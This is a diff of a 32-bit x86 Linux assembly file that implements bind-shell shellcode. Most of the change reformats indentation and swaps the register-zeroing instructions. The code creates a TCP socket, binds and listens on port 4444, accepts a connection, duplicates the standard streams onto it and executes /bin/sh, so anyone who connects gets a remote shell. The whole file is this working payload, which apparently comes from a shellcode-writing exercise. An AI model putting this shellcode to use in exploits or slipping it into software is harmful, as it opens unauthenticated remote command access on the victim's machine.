@@ -23,170 +23,168 @@ _start:
 
 
 
-	; create_socket
+    ; create_socket
 
-	;null eax for cdq
-    	xor eax, eax
+    ;null ebx for cdq
+    xor ebx, ebx
 
-    	;null the edx
-	cdq
+    ;null eax,edx
+    mul ebx
 
-	; syscall 102 in eax
-	push byte 0x66
- 	pop eax
+    ; syscall 102 in eax
+    push byte 0x66
+    pop eax
 
-	; 1 in ebx for type of socketcall
-	xor ebx, ebx
-	mov bl, 0x1
+    ; 1 in ebx for type of socketcall
+    mov bl, 0x1
 
-	; Build the array of arg
-	; push 0 for protocol
-	push edx
-	; push 0x1 for sock_stream
-	push byte 0x1
-	; push 0x2 for af_inet
-	push byte 0x2
+    ; Build the array of arg
+    ; push 0 for protocol
+    push edx
+    ; push 0x1 for sock_stream
+    push byte 0x1
+    ; push 0x2 for af_inet
+    push byte 0x2
 
-	; save pointer of arg array in ecx
-	mov ecx, esp
+    ; save pointer of arg array in ecx
+    mov ecx, esp
 
-	; call interrupt
- 	int 0x80
+    ; call interrupt
+    int 0x80
 
-	; save the socket file descriptor in esi
-	mov esi, eax
-
-
-
-	; socket_bind
-	mov byte al, 0x66
-
-	; increment ebx for socket_bind type
-	inc ebx
-
-	; Build the array of arg
-	push edx
-	; Push the port 4444 in reverse order
-	push word 0x5c11
-	; Push 0x2 for type
-	push word bx
-
-	; save pointer of arg array in ecx
-	mov ecx, esp
-
- 	; Push the sizeof arg array
-	push byte 0x10
-
-	; Push the struct pointer
-	push ecx
-
-	; Push the socket file descriptor
-	push esi
-
-	; Mov in ecx the pointer of argument array
-	mov ecx, esp
-	; Call interrupt
-	; eax = 0 if socket bind work
-	int 0x80
+    ; save the socket file descriptor in esi
+    mov esi, eax
 
 
 
-	; socket_listen
-	mov byte al, 0x66
+    ; socket_bind
+    mov byte al, 0x66
 
-	; increment ebx to 4 for type listen
-	inc ebx
-	inc ebx
+    ; increment ebx for socket_bind type
+    inc ebx
 
-	; Push ebx on the stack
-	push ebx
+    ; Build the array of arg
+    push edx
+    ; Push the port 4444 in reverse order
+    push word 0x5c11
+    ; Push 0x2 for type
+    push word bx
 
-	; Push the socket file descriptor
-	push esi
+    ; save pointer of arg array in ecx
+    mov ecx, esp
 
-	; save argument array in ecx
-	mov ecx, esp
+    ; Push the sizeof arg array
+    push byte 0x10
 
-	; Interrupt
-	int 0x80
+    ; Push the struct pointer
+    push ecx
 
+    ; Push the socket file descriptor
+    push esi
 
-
-
-	; socket_accept
-	mov byte al, 0x66
-
-	; Increment ebx for socket_accept type
-	inc ebx
-
-	; Push 0x0 for socket_len
-	push edx
-
-	; Push 0x0 for sockaddr ptr
-	push edx
-
-	; Push the socket file descriptor
-	push esi
-
-	; Save argument array pointer in ecx
-	mov ecx, esp
-
-	; Interrupt
-	; In eax is the socket file descriptor connected
-	int 0x80
+    ; Mov in ecx the pointer of argument array
+    mov ecx, esp
+    ; Call interrupt
+    ; eax = 0 if socket bind work
+    int 0x80
 
 
 
-	; Dup2 syscall template
-	; mov the socket file descriptor in ebx
-	xchg eax, ebx
+    ; socket_listen
+    mov byte al, 0x66
 
-	; Set 2 in ecx
-	push byte 0x2
-	pop ecx
+    ; increment ebx to 4 for type listen
+    inc ebx
+    inc ebx
 
-	; Dup2 loop instructions
-	dup_loop:
-  		; mov the syscall number 63 in al
-		mov byte al, 0x3f
+    ; Push ebx on the stack
+    push ebx
 
-		; Interrupt
-		int 0x80
+    ; Push the socket file descriptor
+    push esi
 
-		; Decrement ecx
-		dec ecx
+    ; save argument array in ecx
+    mov ecx, esp
 
-		; If the sign flag is not set, ecx is not neg
-		jns dup_loop
+    ; Interrupt
+    int 0x80
 
 
 
-	; Execve syscall for shell
-	; Push the null terminated for strings args
-	push edx
 
-	; Push /bin/sh in reverse order
-	push 0x68732f2f
-	push 0x6e69622f
+    ; socket_accept
+    mov byte al, 0x66
 
-	; Save pointer of arg array in ebx
-	mov ebx, esp
+    ; Increment ebx for socket_accept type
+    inc ebx
 
-	;push null terminated for env
-	push edx
+    ; Push 0x0 for socket_len
+    push edx
 
-	; saving null in edx
-	mov edx, esp
+    ; Push 0x0 for sockaddr ptr
+    push edx
 
-	; Push pointer of /bin/sh on the stack
-	push ebx
+    ; Push the socket file descriptor
+    push esi
 
-	; Save pointer in the ecx
-	mov ecx, esp
+    ; Save argument array pointer in ecx
+    mov ecx, esp
 
-	; mov 0xb 11 for execve syscall
-	mov byte al, 0xb
+    ; Interrupt
+    ; In eax is the socket file descriptor connected
+    int 0x80
 
-	; Interrupt
-	int 0x80
 
+
+    ; Dup2 syscall template
+    ; mov the socket file descriptor in ebx
+    xchg eax, ebx
+
+    ; Set 2 in ecx
+    push byte 0x2
+    pop ecx
+
+    ; Dup2 loop instructions
+    dup_loop:
+        ; mov the syscall number 63 in al
+        mov byte al, 0x3f
+
+        ; Interrupt
+        int 0x80
+
+        ; Decrement ecx
+        dec ecx
+
+        ; If the sign flag is not set, ecx is not neg
+        jns dup_loop
+
+
+
+    ; Execve syscall for shell
+    ; Push the null terminated for strings args
+    push edx
+
+    ; Push /bin/sh in reverse order
+    push 0x68732f2f
+    push 0x6e69622f
+
+    ; Save pointer of arg array in ebx
+    mov ebx, esp
+
+    ;push null terminated for env
+    push edx
+
+    ; saving null in edx
+    mov edx, esp
+
+    ; Push pointer of /bin/sh on the stack
+    push ebx
+
+    ; Save pointer in the ecx
+    mov ecx, esp
+
+    ; mov 0xb 11 for execve syscall
+    mov byte al, 0xb
+
+    ; Interrupt
+    int 0x80
